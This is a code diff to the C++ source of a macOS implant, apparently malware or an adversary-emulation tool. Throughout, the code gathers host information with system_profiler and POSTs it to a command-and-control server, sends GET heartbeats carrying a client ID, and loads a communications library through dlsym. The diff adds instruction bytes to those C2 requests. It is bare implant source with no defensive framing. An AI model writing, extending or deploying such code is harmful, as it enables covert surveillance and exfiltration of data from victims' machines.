@@ -94,7 +94,7 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
         os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";
 
         // send POST request with data to C2
-        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()));
+        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), 0x33);
 
         completed_discovery = true;
     }
@@ -106,7 +106,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
     // heartbeat - send HTTP GET request to server
     std::string heartbeat = c->strClientID;
     std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
-    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);
+    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector, 0x55);
 
     std::cout << "[IMPLANT] Response buffer contains: \n";
     for (auto i: response_vector) {
@@ -149,7 +149,7 @@ void ClientPP::createClientID(ClientPP * c) {
     c->strClientID = id_str;
 }
 
-std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data) {
+std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char instruction) {
     // set response_buffer and response_length to hold the HTTP response and size
     unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
     unsigned char* response_buffer_ptr = &response_buffer[0];
@@ -157,7 +157,7 @@ std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string
     int* response_length_ptr = &response_length;
     
     // loads CommsLib exported function that generates the HTTP request
-    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**))dlsym(dylib, "sendRequest");
+    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char instr) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**, unsigned char))dlsym(dylib, "sendRequest");
     if (sendRequest == NULL) {
         std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
         dlclose(dylib);
@@ -165,7 +165,7 @@ std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string
     }
 
     // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
-    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr);
+    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr, instruction);
 
     return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
 }
